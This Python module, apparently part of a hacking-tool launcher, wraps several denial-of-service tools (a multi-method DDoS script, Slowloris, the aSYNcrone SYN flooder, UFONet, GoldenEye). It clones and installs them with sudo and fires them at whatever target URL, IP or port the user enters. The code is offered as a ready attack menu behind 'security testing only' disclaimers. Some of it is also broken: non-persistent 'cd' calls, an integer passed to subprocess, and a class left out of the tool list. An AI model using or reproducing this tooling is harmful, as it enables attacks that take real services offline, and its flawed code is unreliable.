# coding=utf-8
import os
import subprocess

from core import HackingTool
from core import HackingToolsCollection

class ddos(HackingTool):
    TITLE ="ddos"
    DESCRIPTION = "Best DDoS Attack Script With 36 Plus Methods." \
                  "DDoS attacks\n\b " \
                  "for SECURITY TESTING PURPOSES ONLY! "
    
    INSTALL_COMMANDS = [
        "git clone https://github.com/the-deepnet/ddos.git",
        "cd ddos;sudo pip3 install -r requirements.txt"
    ]
    PROJECT_URL = "https://github.com/the-deepnet/ddos.git"

    def run(self):
        method = input("Enter Method >> ")
        url = input("Enter URL >> ")
        threads = input("Enter Threads >> ")
        proxylist = input(" Enter ProxyList >> ")
        multiple = input(" Enter Multiple >> ")
        timer = input(" Enter Timer >> ")
        os.system("cd ddos;")
        subprocess.run([
            "sudo", "python3 ddos", method, url, "socks_type5.4.1", threads, proxylist, multiple, timer])


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    DESCRIPTION = "Slowloris is basically an HTTP Denial of Service attack." \
                  "It send lots of HTTP Request"
    INSTALL_COMMANDS = ["sudo pip3 install slowloris"]

    def run(self):
        target_site = input("Enter Target Site:- ")
        subprocess.run(["slowloris", target_site])


class Asyncrone(HackingTool):
    TITLE = "Asyncrone | Multifunction SYN Flood DDoS Weapon"
    DESCRIPTION = "aSYNcrone is a C language based, mulltifunction SYN Flood " \
                  "DDoS Weapon.\nDisable the destination system by sending a " \
                  "SYN packet intensively to the destination."
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatih4842/aSYNcrone.git",
        "cd aSYNcrone;sudo gcc aSYNcrone.c -o aSYNcrone -lpthread"
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("Enter Source Port >> ")
        target_ip = input("Enter Target IP >> ")
        target_port = input("Enter Target port >> ")
        os.system("cd aSYNcrone;")
        subprocess.run([
            "sudo", "./aSYNcrone", source_port, target_ip, target_port, 1000])


class UFONet(HackingTool):
    TITLE = "UFOnet"
    DESCRIPTION = "UFONet - is a free software, P2P and cryptographic " \
                  "-disruptive \n toolkit- that allows to perform DoS and " \
                  "DDoS attacks\n\b " \
                  "More Usage Visit"
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/epsylon/ufonet.git",
        "cd ufonet;sudo python3 setup.py install;sudo pip3 install GeoIP;sudo pip3 install python-geoip;sudo pip3 install pygeoip;sudo pip3 install requests;sudo pip3 install pycrypto;sudo pip3 install pycurl;sudo pip3 install whois;sudo pip3 install scapy-python3"
    ]
    RUN_COMMANDS = ["sudo python3 ufonet --gui"]
    PROJECT_URL = "https://github.com/epsylon/ufonet"


class GoldenEye(HackingTool):
    TITLE = "GoldenEye"
    DESCRIPTION = "GoldenEye is an python3 app for SECURITY TESTING PURPOSES ONLY!\n" \
                  "GoldenEye is a HTTP DoS Test Tool."
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/jseidl/GoldenEye.git;"
        "chmod -R 755 GoldenEye"
    ]
    PROJECT_URL = "https://github.com/jseidl/GoldenEye"

    def run(self):
        os.system("cd GoldenEye ;sudo ./goldeneye.py")
        print("\033[96m Go to Directory \n "
              "[*] USAGE: ./goldeneye.py <url> [OPTIONS]")


class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [
        SlowLoris(),
        Asyncrone(),
        UFONet(),
        GoldenEye()
    ]
